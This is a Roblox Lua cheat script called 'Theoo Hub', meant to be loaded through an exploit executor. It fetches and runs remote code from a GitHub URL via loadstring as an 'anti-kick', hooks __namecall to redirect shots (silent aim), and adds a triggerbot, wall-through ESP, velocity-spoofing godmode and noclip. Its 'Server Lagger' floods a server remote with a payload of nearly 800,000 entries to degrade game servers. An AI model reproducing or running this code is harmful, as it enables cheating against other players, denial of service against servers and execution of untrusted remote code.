--[[
  THEOO HUB — Palaiyot Edition (No Fly)
  Splash: "Welcome to Theoo Hub Palaiyot"
  Features: Silent Aim, T-Bot, FOV, Original Godmode, Bypassed Noclip, Highlight ESP, Real Minecraft, Server Lagger.
]]

if not game:IsLoaded() then game.Loaded:Wait() end

-- 0. ANTI-KICK
task.spawn(function()
    pcall(function()
        local url = "https://raw.githubusercontent.com/SUUUUUS00000/MEGGD-Anti-kick/refs/heads/main/MEGGD%20Best%20Anti-kick.lua"
        local runner = loadstring(game:HttpGet(url))
        if type(runner) == "function" then runner(); print("[Anti-Kick] Loaded.") end
    end)
end)

local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace        = game:GetService("Workspace")
local CoreGui          = game:GetService("CoreGui")
local TweenService     = game:GetService("TweenService")
local LocalPlayer      = Players.LocalPlayer
local Camera           = Workspace.CurrentCamera

-- 1. SPLASH SCREEN
local oldSplash = CoreGui:FindFirstChild("TheooSplash")
if oldSplash then oldSplash:Destroy() end
local SplashGui = Instance.new("ScreenGui", CoreGui)
SplashGui.Name = "TheooSplash"; SplashGui.ResetOnSpawn = false; SplashGui.IgnoreGuiInset = true
local SplashBg = Instance.new("Frame", SplashGui)
SplashBg.Size = UDim2.new(1,0,1,0); SplashBg.BackgroundColor3 = Color3.fromRGB(10,10,15); SplashBg.BorderSizePixel = 0
local SplashText = Instance.new("TextLabel", SplashBg)
SplashText.Size = UDim2.new(1,0,0,60); SplashText.Position = UDim2.new(0,0,0.5,-30)
SplashText.BackgroundTransparency = 1; SplashText.Text = "Welcome to Theoo Hub Palaiyot"
SplashText.TextColor3 = Color3.fromRGB(200,200,255); SplashText.Font = Enum.Font.GothamBlack; SplashText.TextSize = 28; SplashText.TextTransparency = 1
TweenService:Create(SplashText, TweenInfo.new(0.5), {TextTransparency=0}):Play()
task.delay(2.5, function()
    TweenService:Create(SplashBg, TweenInfo.new(0.5), {BackgroundTransparency=1}):Play()
    TweenService:Create(SplashText, TweenInfo.new(0.5), {TextTransparency=1}):Play()
    task.wait(0.5)
    SplashGui:Destroy()
end)

-- 2. CONFIG & STATE
local Config = { SilentAim = false, TBot = false, FovSize = 200, Godmode = false, Noclip = false, ESP = false, Minecraft = false }
local SA = { targetPart = nil, namecallOld = nil, hookActive = false }
local lastTBotShot = 0
local GodmodeHeartbeat, GodmodeStepped = nil, nil
local Highlights, mcRestores = {}, {}
local NoClipConnection = nil

-- 3. CORE FUNCTIONS
local function GetTarget()
    local center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    local bestPart, bestScore = nil, math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                local part = p.Character:FindFirstChild("Head")
                if part then
                    local scr, on = Camera:WorldToViewportPoint(part.Position)
                    if on and scr.Z > 0 then
                        local dSq = (scr.X-center.X)^2 + (scr.Y-center.Y)^2
                        if dSq <= Config.FovSize^2 and dSq < bestScore then bestScore = dSq; bestPart = part end
                    end
                end
            end
        end
    end
    return bestPart
end

local function InstallSA()
    if SA.hookActive then return end
    SA.namecallOld = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        if Config.SilentAim and not checkcaller() then
            local args = {...}
            if getnamecallmethod() == "FireServer" then
                for i, v in ipairs(args) do
                    if typeof(v) == "CFrame" and SA.targetPart then args[i] = CFrame.lookAt(v.Position, SA.targetPart.Position) end
                end
                return SA.namecallOld(self, unpack(args))
            end
        end
        return SA.namecallOld(self, ...)
    end))
    SA.hookActive = true
end

local function RunTBot()
    if not Config.TBot then return end
    local target = GetTarget()
    if target and tick() - lastTBotShot >= 0.1 then
        lastTBotShot = tick()
        local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if tool then pcall(function() tool:Activate() end) end
    end
end

-- ORIGINAL GODMODE
local function ToggleGodmode(state)
    if not state then
        if GodmodeHeartbeat then GodmodeHeartbeat:Disconnect() GodmodeHeartbeat = nil end
        if GodmodeStepped then GodmodeStepped:Disconnect() GodmodeStepped = nil end
        return
    end
    GodmodeHeartbeat = RunService.Heartbeat:Connect(function()
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(0.5), 0)
        local old = hrp.Velocity
        hrp.Velocity = Vector3.new(0, -16384, 0)
        RunService.RenderStepped:Wait()
        hrp.Velocity = old
    end)
    GodmodeStepped = RunService.Stepped:Connect(function()
        task.wait(0.1)
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local old = hrp.AssemblyLinearVelocity
        hrp.AssemblyLinearVelocity = Vector3.new(math.random(-2000, 6000), math.random(-13000, 3000), math.random(-6000, 2000))
        RunService.RenderStepped:Wait()
        hrp.AssemblyLinearVelocity = old
    end)
end

-- BYPASSED NOCLIP (Collision Group)
local function ToggleNoclip(state)
    local char = LocalPlayer.Character
    if not char then return end
    if not state then
        if NoClipConnection then NoClipConnection:Disconnect() NoClipConnection = nil end
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = true end
        end
        return
    end
    local function applyNoclip()
        local c = LocalPlayer.Character
        if not c then return end
        for _, part in ipairs(c:GetDescendants()) do
            if part:IsA("BasePart") then 
                part.CanCollide = false
                pcall(function() part.CollisionGroupId = 1 end) 
            end
        end
    end
    applyNoclip()
    NoClipConnection = RunService.Heartbeat:Connect(applyNoclip)
end

-- HIGHLIGHT ESP
local function UpdateESP()
    if not Config.ESP then
        for plr, hl in pairs(Highlights) do if hl then hl:Destroy() end end
        Highlights = {}
        return
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character then
            if not Highlights[plr] or not Highlights[plr].Parent then
                local hl = Instance.new("Highlight")
                hl.FillColor = Color3.fromRGB(255, 182, 213)
                hl.OutlineColor = Color3.new(1,1,1)
                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                hl.Parent = plr.Character
                Highlights[plr] = hl
            end
        end
    end
end

-- REAL MINECRAFT
local textures = { Slate = "rbxassetid://8676746437", Grass = "rbxassetid://9267183930", Sand = "rbxassetid://12624140843", Wood = "rbxassetid://3258599312", Brick = "rbxassetid://10777285622", Concrete = "rbxassetid://15622710576", CorrodedMetal = "rbxassetid://7861269583", Metal = "rbxassetid://12165061309", WoodPlanks = "rbxassetid://8676581022" }
local function ToggleMinecraft(state)
    if state then
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") and obj.Transparency < 0.8 and not mcRestores[obj] then
                local mat = obj.Material.Name; local tex = textures[mat]
                if tex or obj.Color == Color3.fromRGB(254,253,255) then
                    mcRestores[obj] = {Color = obj.Color, Material = obj.Material}; obj.Color = Color3.fromRGB(254,253,255); obj.Material = Enum.Material.SmoothPlastic
                    if tex then local t = Instance.new("Texture", obj); t.Texture = tex; t.Face = Enum.NormalId.Top; t.StudsPerTileU = 6; t.StudsPerTileV = 6 end
                end
            end
        end
    else
        for part, data in pairs(mcRestores) do if part and part.Parent then part.Color = data.Color part.Material = data.Material for _, c in ipairs(part:GetChildren()) do if c:IsA("Texture") then c:Destroy() end end end end
        mcRestores = {}
    end
end

-- SERVER LAGGER
local function ServerLagger()
    local remote = game:FindFirstChild("RobloxReplicatedStorage") and game:FindFirstChild("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
    if remote then
        local payload = table.create(799999)
        for i = 1, 799999 do payload[i] = { id = i, v = i * 2 } end
        remote:FireServer(payload)
        print("[Theoo Hub] Server Lagger Executed.")
    end
end

-- 4. UI CREATION
local Gui = Instance.new("ScreenGui", CoreGui)
Gui.Name = "TheooHub"; Gui.ResetOnSpawn = false
local Main = Instance.new("Frame", Gui)
Main.Size = UDim2.new(0, 260, 0, 360); Main.Position = UDim2.new(0.5, -130, 0.5, -180)
Main.BackgroundColor3 = Color3.fromRGB(15,15,20); Main.Active = true; Main.Draggable = true; Main.Visible = false
Instance.new("UICorner", Main).CornerRadius = UDim.new(0,10)
local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1,0,0,35); Title.BackgroundColor3 = Color3.fromRGB(25,25,35)
Title.Text = "Theoo Hub"; Title.TextColor3 = Color3.new(1,1,1); Title.Font = Enum.Font.GothamBold
Instance.new("UICorner", Title).CornerRadius = UDim.new(0,10)
local Scroll = Instance.new("ScrollingFrame", Main)
Scroll.Size = UDim2.new(1,-20,1,-50); Scroll.Position = UDim2.new(0,10,0,45)
Scroll.BackgroundTransparency = 1; Scroll.CanvasSize = UDim2.new(0,0,0,500)
Instance.new("UIListLayout", Scroll).Padding = UDim.new(0,5)

local function AddToggle(text, default, cb)
    local btn = Instance.new("TextButton", Scroll)
    btn.Size = UDim2.new(1,0,0,35)
    btn.BackgroundColor3 = default and Color3.fromRGB(50,120,70) or Color3.fromRGB(60,60,70)
    btn.Text = text .. " [" .. (default and "ON" or "OFF") .. "]"
    btn.TextColor3 = Color3.new(1,1,1); btn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
    btn.Activated:Connect(function()
        default = not default
        btn.Text = text .. " [" .. (default and "ON" or "OFF") .. "]"
        btn.BackgroundColor3 = default and Color3.fromRGB(50,120,70) or Color3.fromRGB(60,60,70)
        if cb then cb(default) end
    end)
end

AddToggle("Silent Aim", false, function(s) Config.SilentAim = s; if s then InstallSA() end end)
AddToggle("T-Bot (Trigger)", false, function(s) Config.TBot = s end)
AddToggle("Highlight ESP", false, function(s) Config.ESP = s end)
AddToggle("Godmode (Original)", false, ToggleGodmode)
AddToggle("Noclip (Bypassed)", false, ToggleNoclip)
AddToggle("Real Minecraft", false, ToggleMinecraft)
AddToggle("Server Lagger", false, function(s) if s then ServerLagger() end end)

-- 5. MAIN LOOP
local Icon = Instance.new("TextButton", Gui)
Icon.Size = UDim2.new(0, 50, 0, 50); Icon.Position = UDim2.new(0, 20, 0.5, -25)
Icon.BackgroundColor3 = Color3.fromRGB(25,25,35); Icon.Text = "T"
Icon.TextColor3 = Color3.new(1,1,1); Icon.Font = Enum.Font.GothamBold; Icon.TextSize = 24
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
Instance.new("UIStroke", Icon).Color = Color3.fromRGB(100,120,255)

Icon.Activated:Connect(function() Main.Visible = not Main.Visible end)

RunService.RenderStepped:Connect(function()
    if Config.SilentAim then SA.targetPart = GetTarget() else SA.targetPart = nil end
    RunTBot()
    UpdateESP()
end)

print("[Theoo Hub] Palaiyot Edition (No Fly) Loaded.")
